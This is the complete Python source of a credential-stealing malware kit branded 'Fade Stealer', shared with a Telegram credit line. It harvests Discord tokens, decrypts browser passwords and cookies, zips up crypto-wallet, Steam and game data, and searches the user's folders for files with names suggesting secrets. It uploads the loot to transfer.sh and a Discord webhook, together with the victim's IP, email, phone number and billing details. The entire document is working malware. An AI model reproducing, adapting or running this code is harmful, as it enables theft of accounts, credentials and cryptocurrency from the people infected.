Uncompiled by 1336 St34ler Team | https://t.me/st34ler | Don't skid my src ;)

from builtins import all,dir,exec,format,len,ord,print,int,list,range,set,str,open
exec('')
import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads,load
from ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer
from urllib.request import Request,urlopen
from json import loads,dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
hook=''
DETECTED=False
def getip():
    ip='None'
    try:
        ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except:
        pass
    return ip
requirements=[
['requests','requests'],
['Crypto.Cipher','pycryptodome']
]
for modl in requirements:
    try:__import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}",shell=True)
        time.sleep(3)
import requests
from Crypto.Cipher import AES
local=os.getenv('LOCALAPPDATA')
roaming=os.getenv('APPDATA')
temp=os.getenv('TEMP')
Threadlist=[]
class DATA_BLOB(Structure):
    _fields_=[
('cbData',wintypes.DWORD),
('pbData',POINTER(c_char))
]
def GetData(blob_out):
    cbData=int(blob_out.cbData)
    pbData=blob_out.pbData
    buffer=c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer,pbData,cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw
def CryptUnprotectData(encrypted_bytes,entropy=b''):
    buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))
    buffer_entropy=c_buffer(entropy,len(entropy))
    blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in)
    blob_entropy=DATA_BLOB(len(entropy),buffer_entropy)
    blob_out=DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in),None,byref(blob_entropy),None,None,0x01,byref(blob_out)):
        return GetData(blob_out)
def DecryptValue(buff,master_key=None):
    starts=buff.decode(encoding='utf8',errors='ignore')[:3]
    if starts=='v10' or starts=='v11':
        iv=buff[3:15]
        payload=buff[15:]
        cipher=AES.new(master_key,AES.MODE_GCM,iv)
        decrypted_pass=cipher.decrypt(payload)
        decrypted_pass=decrypted_pass[:-16].decode()
        return decrypted_pass
def LoadRequests(methode,url,data='',files='',headers=''):
    for i in range(8):# max trys
        try:
            if methode=='POST':
                if data !='':
                    r=requests.post(url,data=data)
                    if r.status_code==200:
                        return r
                elif files !='':
                    r=requests.post(url,files=files)
                    if r.status_code==200 or r.status_code==413:# 413=DATA TO BIG
                        return r
        except:
            pass
def LoadUrlib(hook,data='',files='',headers=''):
    for i in range(8):
        try:
            if headers !='':
                r=urlopen(Request(hook,data=data,headers=headers))
                return r
            else:
                r=urlopen(Request(hook,data=data))
                return r
        except:
            pass
def Trust(Cookies):
    global DETECTED
    data=str(Cookies)
    tim=re.findall('.google.com',data)
    if len(tim)<-1:
        DETECTED=True
        return DETECTED
    else:
        DETECTED=False
        return DETECTED
def GetUHQFriends(token):
    badgeList=[
{'Name':'Early_Verified_Bot_Developer','Value':4194304,'Emoji':'<:activedev:1046875621193695342> '},
{'Name':'Active_Developer','Value':4194304,'Emoji':'<:activedev:1046875621193695342> '},
{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},
{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},
{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},
{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},
{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},
{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},
{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},
{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},
{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}
]
    headers={
        'Authorization':token,
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    try:
        friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())
    except:
        return False
    uhqlist=''
    for friend in friendlist:
        OwnedBadges=''
        flags=friend['user']['public_flags']
        for badge in badgeList:
            if flags//badge['Value']!=0 and friend['type']==1:
                if not 'House' in badge['Name']:
                    OwnedBadges+=badge['Emoji']
                flags=flags % badge['Value']
        if OwnedBadges !='':
            uhqlist+=f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist
def GetBilling(token):
    headers={
        'Authorization':token,
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    try:
        billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())
    except:
        return False
    if billingjson==[]:return ' -'
    billing=''
    for methode in billingjson:
        if methode['invalid']==False:
            if methode['type']==1:
                billing+=':credit_card:'
            elif methode['type']==2:
                billing+='<:paypal:1027984840131366922>'
    return billing
def GetBadge(flags):
    if flags==0:return ''
    OwnedBadges=''
    badgeList=[
{'Name':'Early_Verified_Bot_Developer','Value':4194304,'Emoji':'<:activedev:1046875621193695342> '},
{'Name':'Active_Developer','Value':4194304,'Emoji':'<:activedev:1046875621193695342>  '},
{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},
{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},
{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},
{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},
{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},
{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},
{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},
{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},
{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}
]
    for badge in badgeList:
        if flags//badge['Value']!=0:
            OwnedBadges+=badge['Emoji']
            flags=flags % badge['Value']
    return OwnedBadges
def GetTokenInfo(token):
    headers={
        'Authorization':token,
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    userjson=loads(urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers)).read().decode())
    username=userjson['username']
    hashtag=userjson['discriminator']
    email=userjson['email']
    idd=userjson['id']
    pfp=userjson['avatar']
    flags=userjson['public_flags']
    nitro=''
    phone='-'
    if 'premium_type' in userjson:
        nitrot=userjson['premium_type']
        if nitrot==1:
            nitro='<:classic:896119171019067423>'
        elif nitrot==2:
            nitro='<a:boost:824036778570416129> <:classic:896119171019067423>'
    if 'phone' in userjson:phone=f'`{userjson["phone"]}`'
    request_guilds=urlopen(Request('https://discord.com/api/v9/users/@me/guilds?with_counts=true',headers=headers)).read().decode()
    check_owner=loads(request_guilds)
    owned=[]
    for server in check_owner:
        if server['owner']==True:
            owned.append(f"*Owner*: {server['owner']} - *Name*: {server['name']} - *Members*: {server['approximate_member_count']}")
    owned_write='\n'.join(owned)
    quality='High'
    request_billing_history=urlopen(Request('https://discord.com/api/v9/users/@me/billing/payments?limit=20',headers=headers)).read().decode()
    search_billing_history=loads(request_billing_history)
    if search_billing_history==[]:
        quality='High'
    else:
        quality='High'
        if search_billing_history[0]['status']==2 or search_billing_history[0]['status']==0:
            quality='Low'
    return username,hashtag,email,idd,pfp,flags,nitro,phone,owned_write,quality
def checkToken(token):
    headers={
        'Authorization':token,
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/201001 01 Firefox/102.0'
}
    try:
        urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers))
        return True
    except:
        return False
def uploadToken(token,path):
    global hook
    headers={
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    username,hashtag,email,idd,pfp,flags,nitro,phone,servers,quality=GetTokenInfo(token)
    if pfp==None:
        pfp='https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png'
    else:
        pfp=f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
    billing=GetBilling(token)
    badge=GetBadge(flags)
    friends=GetUHQFriends(token)
    if friends=='':friends='No Rare Friends found'
    if not billing:
        billing='Invalid PM'
    if nitro=='' and badge=='':nitro=' -'
    data={
        'content':f'**WEEP WOOP NEW LOG CAME IN, CHECK IT OUT! <a:celebration:1046934178253525023>**',
        'embeds':[
{
            'color':3449140,
            'fields':[
{
                    'name':'<a:fades1:1046934903486435368> Token:',
                    'value':f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
},
{
                    'name':':incoming_envelope: Email:',
                    'value':f"`{email}`",
                    'inline':True
},
{
                    'name':':mobile_phone: Phone:',
                    'value':f"{phone}",
                    'inline':True
},
{
                    'name':'<a:fade2:1047181964991545435> IP:',
                    'value':f"`{getip()}`",
                    'inline':True
},
{
                    'name':'<:green:1046934575173095525> Badges:',
                    'value':f"{nitro}{badge}",
                    'inline':True
},
{
                    'name':'<a:loading:1046936802516279327> Billing:',
                    'value':f"{billing}",
                    'inline':True
},
{
                    'name':'<:friends:1046936521766342726> Quality Friends:',
                    'value':f"{friends}",
                    'inline':False
},
{
                    'name':':desktop: Servers:',
                    'value':f"{servers}",
                    'inline':False
},
{
                    'name':':gear: Billing Quality:',
                    'value':f"{quality}",
                    'inline':False
}
],
            'author':{
                'name':f"{username}#{hashtag} ({idd})",
                'icon_url':f"{pfp}"
},
            'footer':{
                'text':'Sponsored by .gg/fades | t.me/zonef7',
                'icon_url':'https://cdn.discordapp.com/attachments/1045609912035704833/1046198631746785311/FADE.gif'
},
            'thumbnail':{
                'url':f"{pfp}"
}
}
],
        'avatar_url':'https://cdn.discordapp.com/attachments/1046112095957176400/1046206221872541726/image.png',
        'username':'FADE | STEALER',
        'attachments':[]
}
    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
def Reformat(listt):
    e=re.findall('(\\w+[a-z])',listt)
    while 'https' in e:e.remove('https')
    while 'com' in e:e.remove('com')
    while 'net' in e:e.remove('net')
    return list(set(e))
def upload(name,tk=''):
    headers={
        'Content-Type':'application/json',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
    if name=='kiwi':
        data={
        'content':'',
        'embeds':[
{
            'color':3449140,
            'fields':[
{
                'name':'Victim has some delicous stuff located, check it out!',
                'value':tk
}
],
            'author':{
                'name':'Password Information:'
},
            'footer':{
                'text':'@Fade Stealer',
                'icon_url':'https://cdn.discordapp.com/attachments/1045609912035704833/1046198631746785311/FADE.gif'
}
}
],
        'avatar_url':'https://cdn.discordapp.com/attachments/1045609912035704833/1046198631746785311/FADE.gif',
        'attachments':[]
}
        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
        return
    path=name
    files={'file':open(path,'rb')}
    if 'passwords' in name:
        ra=' | '.join(da for da in paswWords)
        if len(ra)>1000:
            rrr=Reformat(str(paswWords))
            ra=' | '.join(da for da in rrr)
        data={
        'content':'',
        'embeds':[
{
            'color':3449140,
            'fields':[
{
                'name':'Passwords that have been found:',
                'value':ra
}
],
            'author':{
                'name':'Fade | Password Stealer'
},
            'footer':{
                'text':'@Fade Stealer',
                'icon_url':'https://cdn.discordapp.com/attachments/1045609912035704833/1046198631746785311/FADE.gif'
}
}
],
        'avatar_url':'https://cdn.discordapp.com/attachments/1045609912035704833/1046198631746785311/FADE.gif',
        'attachments':[]
}
        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
    if 'cookies' in name:
        rb=' | '.join(da for da in cookiWords)
        if len(rb)>1000:
            rrrrr=Reformat(str(cookiWords))
            rb=' | '.join(da for da in rrrrr)
        data={
        'content':'',
        'embeds':[
{
            'color':3449140,
            'fields':[
{
                'name':'Cookies that have been found:',
                'value':rb
}
],
            'author':{
                'name':'Cookies Information:'
},
            'footer':{
                'text':'@Fade Stealer',
                'icon_url':'https://cdn.discordapp.com/attachments/1045609912035704833/1046198631746785311/FADE.gif'
}
}
],
        'avatar_url':'https://cdn.discordapp.com/attachments/1045609912035704833/1046198631746785311/FADE.gif',
        'attachments':[]
}
        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
    LoadRequests('POST',hook,files=files)
def writeforfile(data,name):
    path=os.getenv('TEMP')+f"\{name}.txt"
    with open(path,mode='w',encoding='utf-8')as f:
        for line in data:
            if line[0]!='':
                f.write(f"{line}\n")
Tokens=''
def getToken(path,arg):
    if not os.path.exists(path):return
    path+=arg
    for file in os.listdir(path):
        if file.endswith('.log')or file.endswith('.ldb'):
            for line in[x.strip()for x in open(f"{path}\\{file}",errors='ignore').readlines()if x.strip()]:
                for regex in('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}','mfa\\.[\\w-]{80,95}'):
                    for token in re.findall(regex,line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                Tokens+=token
                                uploadToken(token,path)
Passw=[]
def getPassw(path,arg):
    global Passw
    if not os.path.exists(path):return
    pathC=path+arg+'/Login Data'
    if os.stat(pathC).st_size==0:return
    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'
    shutil.copy2(pathC,tempfold)
    conn=sql_connect(tempfold)
    cursor=conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins;')
    data=cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    pathKey=path+'/Local State'
    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())
    master_key=b64decode(local_state['os_crypt']['encrypted_key'])
    master_key=CryptUnprotectData(master_key[5:])
    for row in data:
        if row[0]!='':
            for wa in keyword:
                old=wa
                if 'https' in wa:
                    tmp=wa
                    wa=tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords:paswWords.append(old)
            Passw.append(f"{row[0]} | {row[1]} | {DecryptValue(row[2], master_key)}")
    writeforfile(Passw,'passwords')
Cookies=[]
def getCookie(path,arg):
    global Cookies
    if not os.path.exists(path):return
    pathC=path+arg+'/Cookies'
    if os.stat(pathC).st_size==0:return
    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'
    shutil.copy2(pathC,tempfold)
    conn=sql_connect(tempfold)
    cursor=conn.cursor()
    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
    data=cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    pathKey=path+'/Local State'
    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())
    master_key=b64decode(local_state['os_crypt']['encrypted_key'])
    master_key=CryptUnprotectData(master_key[5:])
    for row in data:
        if row[0]!='':
            for wa in keyword:
                old=wa
                if 'https' in wa:
                    tmp=wa
                    wa=tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords:cookiWords.append(old)
            Cookies.append(f"HOST KEY: {row[0]} | NAME: {row[1]} | VALUE: {DecryptValue(row[2], master_key)}")
    writeforfile(Cookies,'cookies')
def GetDiscord(path,arg):
    if not os.path.exists(f"{path}/Local State"):return
    pathC=path+arg
    pathKey=path+'/Local State'
    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())
    master_key=b64decode(local_state['os_crypt']['encrypted_key'])
    master_key=CryptUnprotectData(master_key[5:])
    for file in os.listdir(pathC):
        if file.endswith('.log')or file.endswith('.ldb'):
            for line in[x.strip()for x in open(f"{pathC}\\{file}",errors='ignore').readlines()if x.strip()]:
                for token in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',line):
                    global Tokens
                    tokenDecoded=DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]),master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            Tokens+=tokenDecoded
                            uploadToken(tokenDecoded,path)
def ZipThings(path,arg,procc):
    pathC=path
    name=arg
    if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:
        browser=path.split('\\')[4].split('/')[1].replace(' ','')
        name=f"Metamask_{browser}"
        pathC=path+arg
    if not os.path.exists(pathC):return
    subprocess.Popen(f"taskkill /im {procc} /t /f",shell=True)
    if 'Wallet' in arg or 'NationsGlory' in arg:
        browser=path.split('\\')[4].split('/')[1].replace(' ','')
        name=f"{browser}"
    elif 'Steam' in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"):return
        f=open(f"{pathC}/loginusers.vdf",'r+',encoding='utf8')
        data=f.readlines()
        found=False
        for l in data:
            if 'RememberPassword"		"1"' in l:
                found=True
        if found==False:return
        name=arg
    zf=ZipFile(f"{pathC}/{name}.zip",'w')
    for file in os.listdir(pathC):
        if not '.zip' in file:zf.write(pathC+'/'+file)
    zf.close()
    upload(f'{pathC}/{name}.zip')
    os.remove(f"{pathC}/{name}.zip")
def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths=[
[f"{roaming}/Opera Software/Opera GX Stable",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[f"{roaming}/Opera Software/Opera Stable",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[f"{roaming}/Opera Software/Opera Neon/User Data/Default",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[f"{local}/Google/Chrome/User Data",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[f"{local}/Google/Chrome SxS/User Data",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[f"{local}/BraveSoftware/Brave-Browser/User Data",'brave.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[f"{local}/Yandex/YandexBrowser/User Data",'yandex.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],
[f"{local}/Microsoft/Edge/User Data",'edge.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
]
    discordPaths=[
[f"{roaming}/Discord",'/Local Storage/leveldb'],
[f"{roaming}/Lightcord",'/Local Storage/leveldb'],
[f"{roaming}/discordcanary",'/Local Storage/leveldb'],
[f"{roaming}/discordptb",'/Local Storage/leveldb'],
]
    PathsToZip=[
[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"','Wallet'],
[f"{roaming}/Exodus/exodus.wallet",'Exodus.exe','Wallet'],
['C:\\Program Files (x86)\\Steam\\config','steam.exe','Steam'],
[f"{roaming}/NationsGlory/Local Storage/leveldb",'NationsGlory.exe','NationsGlory']
]
    for patt in browserPaths:
        a=threading.Thread(target=getToken,args=[patt[0],patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths:
        a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])
        a.start()
        Threadlist.append(a)
    for patt in browserPaths:
        a=threading.Thread(target=getPassw,args=[patt[0],patt[3]])
        a.start()
        Threadlist.append(a)
    ThCokk=[]
    for patt in browserPaths:
        a=threading.Thread(target=getCookie,args=[patt[0],patt[4]])
        a.start()
        ThCokk.append(a)
    for thread in ThCokk:thread.join()
    DETECTED=Trust(Cookies)
    if DETECTED==True:return
    for patt in browserPaths:
        threading.Thread(target=ZipThings,args=[patt[0],patt[5],patt[1]]).start()
    for patt in PathsToZip:
        threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]]).start()
    for thread in Threadlist:
        thread.join()
    global upths    
    upths=[]
    for file in['passwords.txt','cookies.txt']:
        upload(os.getenv('TEMP')+'\\'+file)
def uploadToAnonfiles(path):
    try:
        files={'file':(path,open(path,mode='rb'))}
        upload=requests.post('https://transfer.sh/',files=files)
        url=upload.text
        return url
    except:
        return False
def KiwiFolder(pathF,keywords):
    global KiwiFiles
    maxfilesperdir=7
    i=0
    listOfFile=os.listdir(pathF)
    ffound=[]
    for file in listOfFile:
        if not os.path.isfile(pathF+'/'+file):return
        i+=1
        if i<=maxfilesperdir:
            url=uploadToAnonfiles(pathF+'/'+file)
            ffound.append([pathF+'/'+file,url])
        else:
            break
    KiwiFiles.append(['folder',pathF+'/',ffound])
KiwiFiles=[]
def KiwiFile(path,keywords):
    global KiwiFiles
    fifound=[]
    listOfFile=os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path+'/'+file)and '.txt' in file:
                    fifound.append([path+'/'+file,uploadToAnonfiles(path+'/'+file)])
                    break
                if os.path.isdir(path+'/'+file):
                    target=path+'/'+file
                    KiwiFolder(target,keywords)
                    break
    KiwiFiles.append(['folder',path,fifound])
def Kiwi():
    user=temp.split('\\AppData')[0]
    path2search=[
        user+'/Desktop',
        user+'/Downloads',
        user+'/Documents'
]
    key_wordsFolder=[
        'account',
        'acount',
        'passw',
        'secret'
]
    key_wordsFiles=[
        'passw',
        'mdp',
        'motdepasse',
        'mot_de_passe',
        'login',
        'secret',
        'account',
        'acount',
        'paypal',
        'banque',
        'account',
        'metamask',
        'wallet',
        'crypto',
        'exodus',
        'discord',
        '2fa',
        'code',
        'memo',
        'compte',
        'token',
        'backup',
        'secret',
        'prox'
]
    wikith=[]
    for patt in path2search:
        kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith
global keyword,cookiWords,paswWords
keyword=[
    'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)'
]
cookiWords=[]
paswWords=[]
GatherAll()
DETECTED=Trust(Cookies)
if not DETECTED:
    wikith=Kiwi()
    for thread in wikith:thread.join()
    time.sleep(0.2)
    filetext='\n'
    for arg in KiwiFiles:
        if len(arg[2])!=0:
            foldpath=arg[1]
            foldlist=arg[2]
            filetext+=f"� {foldpath}\n"
            for ffil in foldlist:
                a=ffil[0].split('/')
                fileanme=a[len(a)-1]
                b=ffil[1]
                filetext+=f"... [{fileanme}]({b})\n"
            filetext+='\n'
    upload('kiwi',filetext)
